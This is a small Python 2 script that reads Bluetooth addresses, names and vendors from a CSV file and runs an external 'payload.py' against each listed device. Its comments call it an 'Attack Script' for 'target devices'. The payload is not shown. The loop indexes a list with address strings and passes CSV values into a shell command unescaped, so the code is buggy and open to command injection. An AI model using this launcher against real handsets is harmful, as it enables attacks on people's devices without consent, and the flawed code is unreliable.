import csv
from optparse import OptionParser
import os

# lists for handset data
nameList = []
vendorList = []
btaddrList = []
dbgMode = False

def csvParser(dbgMode):
    #print dbgMode
    print 'Opening csv..'
    with open('input.csv') as csvDataFile:
        csvReader = csv.reader(csvDataFile)
        for row in csvReader:
            btaddrList.append(row[0])
            nameList.append(row[1])
            vendorList.append(row[2])
    if(dbgMode == True):
        print "ADDR \t\t\t NAME \t\t VENDOR"
        for x in range(len(btaddrList)):
            print btaddrList[x]  + '\t'  + nameList[x] + '\t' + vendorList[x]

# Attack Script is called for all target devices
def payloadDropper(btaddrList):
    # PAYLOAD TARGET
    for addr in btaddrList:
        os.system("python payload.py TARGET=" + btaddrList[addr])

def main():
    # -d/-debug flag created, prints out terget devices from database input
    parser = OptionParser(usage="usage %prog [options]",
                            version="%prog 1.0")
    parser.add_option("-d", "--debug",
                      action = "store_true",
                      dest= "debug",
                      default = False,
                      help= "runs in a verbose debug mode")
    (options, args) = parser.parse_args()
    if(options.debug == True):
        csvParser(True)
    else:
        csvParser(False)
    payloadDropper(btaddrList)
main()
